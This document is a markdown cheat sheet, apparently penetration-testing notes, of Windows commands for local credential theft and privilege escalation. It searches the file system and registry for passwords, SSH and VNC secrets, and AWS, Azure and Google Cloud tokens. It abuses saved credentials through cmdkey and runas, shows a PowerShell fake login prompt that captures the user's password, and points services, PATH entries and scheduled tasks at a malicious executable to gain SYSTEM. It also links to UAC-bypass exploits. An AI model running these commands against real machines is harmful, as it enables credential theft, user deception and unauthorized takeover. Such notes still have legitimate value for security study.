# Credentials Enum

## Low Hanging Passwords : 
```
> dir /b /a /s c:\ > c:\rto\c-dirs.txt 

> type c:\PATH\dirs.txt | findstr /i passw
```
## Interesting Files : 
```
> type c:\PATH\dirs.txt | findstr /i ssh 

> type c:\PATH\dirs.txt | findstr /i kdbx 

> type c:\PATH\dirs.txt | findstr /i vnc 

- [x] install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, id_dsa, .ovpn, .rdp, vnc, ftp, ssh, vpn, git, .kdbx, .db 

- [x] unattend.xml 

- [x] Unattended.xml 

- [x] sysprep.inf 

- [x] sysprep.xml 

- [x] VARIABLES.DAT 

- [x] setupinfo 

- [x] setupinfo.bak 

- [x] web.config 

- [x] SiteList.xml 

- [x] .aws\credentials 

- [x] .azure\accessTokens.json 

- [x] .azure\azureProfile.json 

- [x] gcloud\credentials.db 

- [x] gcloud\legacy_credentials 

- [x] gcloud\access_tokens.db 
```
## Registry : 
```
> reg query "HKCU\Software\ORL\WinVNC3\Password" 

> reg query "HKCU\Software\TightVNC\Server" 

> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 

> reg query "HKCU\Software\OpenSSH\Agent\Keys" 

> reg query HKLM /f password /t REG_SZ /s 

> reg query HKCU /f password /t REG_SZ /s 

```
## Abusing Credential Manager 

```
> cmdkey /list 

> runas /savecred /user:admin cmd.exe 

> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\PATH\admin.txt" 
```
- Asking User for Creds
```
> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```
## Unsecured Objects
- Using Acesschk
 ```
> accesschk.exe -accepteula -wuvc "Everyone" *
> accesschk.exe -accepteula -wuvc "Users" *
> accesschk.exe -accepteula -wuvc "Authenticated Users" *
> accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > c:\regs.txt 
```
- Searching for all unquoted services binary paths:  

``` 
> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 
```
- Checking sshd service configuration and status: 
``` 
> sc query sshd 
> sc qc sshd 
```
- Reonfiguration and exploitation: 
```
> sc config sshd binPath= "c:\mal.exe" 
> sc start sshd 
```
- Reconfiguring a vulnerable service: 
```
> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT 
> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d C:\mal.exe /f 
```
## Execution Flow Hijacking
- Unsecured File System 
```
> accesschk.exe -accepteula -wus "Users" c:\*.* > c:\fld-usr.txt 
> accesschk.exe -accepteula -wus "Authenticated Users" c:\*.* > c:\fld-authusr.txt 
```
- Exploiting PATH 

``` 
> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" 
> icacls c:\bin 
> copy c:\windows\system32\cmd.exe c:\bin\notepad.exe 
```
- Missing Services

```
> autorunsc64.exe -a s | more 
> sc query AdobeUpdate 
> sc qc AdobeUpdate 
> copy c:\mal.exe c:\bin\AdobeUpdate.exe 
```
- Missing Task 
``` 
> autorunsc64.exe -a t | more
> c:\autorunsc64.exe -a t | more  
> schtasks /query /tn OneDriveChk /xml 
> copy c:\mal.exe C:\OneDriveChk.exe 
```
- Converting SID to username: 
```
> wmic useraccount where sid='****' get name 
```
## DLL Hijacking 
- [UAC bypass exploits](https://github.com/hfiref0x/UADLL)

## GETTING SYSTEM
 -  AlwaysInstallElevated

```
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
```
- Abusing Tokens
```
> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT 
> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT 
> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d c:\tokendance.exe /f 
```
